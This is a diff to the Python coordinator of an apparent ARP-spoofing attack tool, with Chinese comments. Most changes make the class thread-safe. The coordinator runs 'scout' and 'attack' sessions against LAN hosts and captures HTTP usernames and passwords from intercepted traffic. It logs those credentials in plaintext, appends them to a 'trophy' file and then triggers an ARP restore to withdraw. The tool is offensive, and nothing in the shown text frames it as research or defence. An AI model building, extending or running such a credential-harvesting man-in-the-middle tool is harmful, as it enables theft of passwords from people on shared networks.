@@ -115,10 +115,13 @@ class AttackCoordinator:
                             self._restoring_targets.clear()
                             self.logger.info("🧹 Cleared ARP restore tracking cache")
                     
-                    # ★【新增】★ 每5分钟输出会话统计
+                    # ★【新增】★ 每5分钟输出会话统计和并发状态
                     if not hasattr(self, '_last_stats_log') or current_time - self._last_stats_log > 300:
                         stats = self.get_session_stats()
                         self.logger.info(f"📊 Session Stats: Scout {stats['active_scouts']}/{stats['max_scout_attacks']} ({stats['scout_utilization']:.1f}%), Attack {stats['active_attacks']}/{stats['max_active_attacks']} ({stats['attack_utilization']:.1f}%)")
+                        
+                        # ★【新增】★ 输出并发状态，便于监控竞争条件
+                        self.log_concurrency_status()
                         self._last_stats_log = current_time
                     
                 except Exception as e:
@@ -298,11 +301,31 @@ class AttackCoordinator:
         
         # ★【核心逻辑4】★ 凭据捕获处理（无论在哪种攻击模式下）
         if analysis.http_credentials:
-            self.logger.info(f"🏆 Credentials captured from {target_ip}: "
-                           f"{analysis.http_credentials['username']}:"
-                           f"{analysis.http_credentials['password']}")
+            # ★【原子性增强】★ 先进行原子性凭据去重检查
+            username = analysis.http_credentials.get('username', '')
+            password = analysis.http_credentials.get('password', '')
+            credential_key = f"{target_ip}:{username}:{password}"
             
-            # 保存凭据到文件
+            # 快速原子性检查，避免重复处理
+            with self._global_credentials_lock:
+                if (credential_key in self._processed_credentials or 
+                    credential_key in self._processing_credentials or
+                    self.state_cache.has_credentials_saved(credential_key)):
+                    
+                    with self.stats_lock:
+                        self.stats['credentials_deduplicated'] += 1
+                    self.logger.debug(f"🚫 Credentials {credential_key} already handled, skipping HTTP processing")
+                    
+                    return AttackDecision(
+                        action='ignore',
+                        target_ip=target_ip,
+                        reason='credentials_already_processed'
+                    )
+            
+            self.logger.info(f"🏆 Credentials captured from {target_ip}: "
+                           f"{username}:{password}")
+            
+            # 保存凭据到文件（内部有原子性保护）
             self._save_credentials(target_ip, analysis.http_credentials, analysis.metadata)
             
             # ★【分离管理5】★ 清理会话跟踪
@@ -401,12 +424,15 @@ class AttackCoordinator:
             }
     
     def _save_credentials(self, source_ip: str, credentials: Dict[str, str], metadata: Dict):
-        """保存捕获的凭据并触发立即撤离 - 强化去重版本"""
+        """保存捕获的凭据并触发立即撤离 - 真正原子性版本
+        
+        ★【关键修复】★ 实现真正的"检查-并-设置"原子操作，彻底消除多线程竞争条件
+        """
         username = credentials.get('username', '')
         password = credentials.get('password', '')
         credential_key = f"{source_ip}:{username}:{password}"
         
-        # ★【第一层】★ 快速检查 - 避免重复计算
+        # ★【原子性核心】★ 单一锁保护整个"检查-并-设置"操作
         with self._global_credentials_lock:
             # 定期清理已处理集合，避免内存泄漏
             current_time = time.time()
@@ -415,106 +441,135 @@ class AttackCoordinator:
                 self._last_cleanup = current_time
                 self.logger.debug("🧹 Cleared processed credentials cache")
             
-            # 检查是否已经处理过
+            # ★【原子检查1】★ 检查是否已经处理过
             if credential_key in self._processed_credentials:
                 with self.stats_lock:
                     self.stats['credentials_deduplicated'] += 1
                 self.logger.debug(f"🚫 Credentials {credential_key} already processed globally, skipping")
                 return
             
-            # 检查是否正在处理中
+            # ★【原子检查2】★ 检查是否正在处理中
             if credential_key in self._processing_credentials:
                 with self.stats_lock:
                     self.stats['credentials_deduplicated'] += 1
                 self.logger.debug(f"🚫 Credentials {credential_key} currently being processed, skipping")
                 return
             
-            # 标记为正在处理
-            self._processing_credentials.add(credential_key)
-        
-        try:
-            # ★【第二层】★ 状态缓存检查
+            # ★【原子检查3】★ 状态缓存检查
             if self.state_cache.has_credentials_saved(credential_key):
-                self.logger.debug(f"🚫 Credentials for {credential_key} already in state cache, skipping")
+                with self.stats_lock:
+                    self.stats['credentials_deduplicated'] += 1
+                self.logger.debug(f"🚫 Credentials {credential_key} already in state cache, skipping")
                 return
             
-            # ★【第三层】★ 文件级别检查（可选，性能考虑可移除）
-            # 这里可以加入文件去重检查，但考虑到性能，先跳过
+            # ★【原子设置】★ 在所有检查通过后，原子性地标记为正在处理和已处理
+            # 这确保了只有一个线程能进入处理逻辑
+            self._processing_credentials.add(credential_key)
+            self._processed_credentials.add(credential_key)
             
-            # 执行实际保存
-            timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
-            log_entry = f"{source_ip},{username},{password},{timestamp}\n"
-            
-            trophy_file = "temporary.txt"
-            with open(trophy_file, "a", encoding="utf-8") as f:
-                f.write(log_entry)
-            
-            # 标记为已保存
-            self.state_cache.mark_credentials_saved(credential_key)
-            
-            # 添加到已处理集合
-            with self._global_credentials_lock:
-                self._processed_credentials.add(credential_key)
-            
-            self.logger.info(f"🏆 Credentials captured from {source_ip}: {username}:{password}")
-            self.logger.info(f"🏆 Credentials saved to {trophy_file}: {username}@{source_ip}")
-            
-            # ★【强化ARP恢复去重】★ 发送立即停止攻击命令
-            self._trigger_immediate_withdrawal(source_ip)
-            
-        except Exception as e:
-            self.logger.error(f"Failed to save credentials: {e}")
-        finally:
-            # ★【重要】★ 无论成功失败都要从处理中集合移除
-            with self._global_credentials_lock:
+            # 在锁内执行实际保存操作，确保完全的原子性
+            try:
+                # 执行实际保存
+                timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+                log_entry = f"{source_ip},{username},{password},{timestamp}\n"
+                
+                trophy_file = "temporary.txt"
+                with open(trophy_file, "a", encoding="utf-8") as f:
+                    f.write(log_entry)
+                
+                # 标记为已保存
+                self.state_cache.mark_credentials_saved(credential_key)
+                
+                self.logger.info(f"🏆 Credentials captured from {source_ip}: {username}:{password}")
+                self.logger.info(f"🏆 Credentials saved to {trophy_file}: {username}@{source_ip}")
+                
+                # ★【强化ARP恢复去重】★ 发送立即停止攻击命令
+                self._trigger_immediate_withdrawal(source_ip)
+                
+            except Exception as e:
+                self.logger.error(f"Failed to save credentials: {e}")
+                # 发生错误时，从已处理集合中移除，允许重试
+                self._processed_credentials.discard(credential_key)
+            finally:
+                # ★【重要】★ 无论成功失败都要从处理中集合移除
                 self._processing_credentials.discard(credential_key)
     
     def _trigger_immediate_withdrawal(self, source_ip: str):
-        """触发立即撤离 - 带ARP恢复去重"""
+        """触发立即撤离 - 真正原子性的ARP恢复去重
+        
+        ★【关键修复】★ 确保每个IP只发送一次RESTORE_ARP命令，彻底消除消息风暴
+        """
+        # ★【原子性核心】★ 单一锁保护整个"检查-并-设置"操作
         with self._arp_restore_lock:
+            # ★【原子检查】★ 检查是否已在恢复中
             if source_ip in self._restoring_targets:
                 with self.stats_lock:
                     self.stats['arp_restore_deduplicated'] += 1
                 self.logger.debug(f"🚫 ARP restore for {source_ip} already in progress, skipping")
                 return
             
-            # 标记为正在恢复
+            # ★【原子设置】★ 在检查通过后，原子性地标记为正在恢复
             self._restoring_targets.add(source_ip)
-        
-        try:
-            stop_command = {
-                'type': 'STOP_SPOOF',
-                'target_ip': source_ip,
-                'reason': 'credentials_captured'
-            }
             
-            if self.command_sender:
-                self.command_sender(stop_command)
-                self.logger.info(f"⚡ Immediate withdrawal triggered for {source_ip} - credentials captured!")
-                self.logger.info(f"Restoring ARP for {source_ip}")
+            # 在锁内执行命令发送，确保完全的原子性
+            try:
+                stop_command = {
+                    'type': 'RESTORE_ARP',  # ★【协议统一】★ 使用明确的RESTORE_ARP命令
+                    'target_ip': source_ip,
+                    'reason': 'credentials_captured'
+                }
                 
-                # 延迟移除恢复标记，给C++足够时间处理
-                def remove_restore_flag():
-                    time.sleep(2)  # 2秒后移除标记
-                    with self._arp_restore_lock:
-                        self._restoring_targets.discard(source_ip)
-                
-                threading.Thread(target=remove_restore_flag, daemon=True).start()
-            else:
-                # 如果没有command_sender，立即移除标记
-                with self._arp_restore_lock:
+                if self.command_sender:
+                    self.command_sender(stop_command)
+                    self.logger.info(f"⚡ Immediate withdrawal triggered for {source_ip} - credentials captured!")
+                    self.logger.info(f"🔧 Restoring ARP for {source_ip} (atomic operation)")
+                    
+                    with self.stats_lock:
+                        self.stats['restores_initiated'] += 1
+                    
+                    # ★【优化】★ 延迟移除恢复标记，给C++足够时间处理
+                    def remove_restore_flag():
+                        time.sleep(3)  # 3秒后移除标记，确保C++端处理完成
+                        with self._arp_restore_lock:
+                            self._restoring_targets.discard(source_ip)
+                            self.logger.debug(f"🧹 Removed restore flag for {source_ip}")
+                    
+                    # 启动清理定时器
+                    cleanup_timer = threading.Timer(3.0, remove_restore_flag)
+                    cleanup_timer.daemon = True
+                    cleanup_timer.start()
+                    
+                else:
+                    self.logger.warning(f"❌ No command_sender available for {source_ip}")
+                    # 如果没有command_sender，立即移除标记
                     self._restoring_targets.discard(source_ip)
                     
-        except Exception as e:
-            self.logger.error(f"Failed to trigger withdrawal for {source_ip}: {e}")
-            # 发生错误时移除标记
-            with self._arp_restore_lock:
+            except Exception as e:
+                self.logger.error(f"Failed to trigger withdrawal for {source_ip}: {e}")
+                # 发生错误时移除标记，允许重试
                 self._restoring_targets.discard(source_ip)
     
     def get_statistics(self) -> Dict[str, Any]:
         """获取协调器统计信息"""
         with self.stats_lock:
             stats = dict(self.stats)
+        
+        # 添加实时并发状态
+        with self._global_credentials_lock:
+            stats.update({
+                'processing_credentials_count': len(self._processing_credentials),
+                'processed_credentials_count': len(self._processed_credentials)
+            })
+        
+        with self._arp_restore_lock:
+            stats['restoring_targets_count'] = len(self._restoring_targets)
+        
+        with self._decision_lock:
+            stats['processing_decisions_count'] = len(self._processing_decisions)
+        
+        # 添加会话状态
+        session_stats = self.get_session_stats()
+        stats.update(session_stats)
         
         # 添加状态缓存统计
         cache_stats = self.state_cache.get_statistics()
@@ -523,6 +578,50 @@ class AttackCoordinator:
         })
         
         return stats
+    
+    def log_concurrency_status(self):
+        """★【新增】★ 记录并发状态，用于调试"""
+        with self._global_credentials_lock, self._arp_restore_lock, self._decision_lock:
+            session_stats = self.get_session_stats()
+            
+            self.logger.info(f"🔄 Concurrency Status - "
+                           f"Processing Credentials: {len(self._processing_credentials)}, "
+                           f"Processed Credentials: {len(self._processed_credentials)}, "
+                           f"Restoring Targets: {len(self._restoring_targets)}, "
+                           f"Processing Decisions: {len(self._processing_decisions)}, "
+                           f"Active Scouts: {session_stats['active_scouts']}/{session_stats['max_scout_attacks']}, "
+                           f"Active Attacks: {session_stats['active_attacks']}/{session_stats['max_active_attacks']}")
+    
+    def force_cleanup_all_locks(self):
+        """★【紧急方法】★ 强制清理所有锁状态，仅在调试或恢复时使用"""
+        self.logger.warning("🚨 Force cleaning all lock states - this should only be used for debugging!")
+        
+        with self._global_credentials_lock:
+            processing_count = len(self._processing_credentials)
+            processed_count = len(self._processed_credentials)
+            self._processing_credentials.clear()
+            self._processed_credentials.clear()
+            self.logger.warning(f"🧹 Force cleared {processing_count} processing + {processed_count} processed credentials")
+        
+        with self._arp_restore_lock:
+            restoring_count = len(self._restoring_targets)
+            self._restoring_targets.clear()
+            self.logger.warning(f"🧹 Force cleared {restoring_count} restoring targets")
+        
+        with self._decision_lock:
+            decision_count = len(self._processing_decisions)
+            self._processing_decisions.clear()
+            self.logger.warning(f"🧹 Force cleared {decision_count} processing decisions")
+        
+        with self.active_scouts_lock:
+            scout_count = len(self.active_scouts)
+            self.active_scouts.clear()
+            self.logger.warning(f"🧹 Force cleared {scout_count} active scouts")
+        
+        with self.active_attacks_lock:
+            attack_count = len(self.active_attacks)
+            self.active_attacks.clear()
+            self.logger.warning(f"🧹 Force cleared {attack_count} active attacks")
     
     def register_active_attack(self, target_ip: str, duration: int) -> bool:
         """★【新增】★ 注册活跃攻击，返回是否成功"""
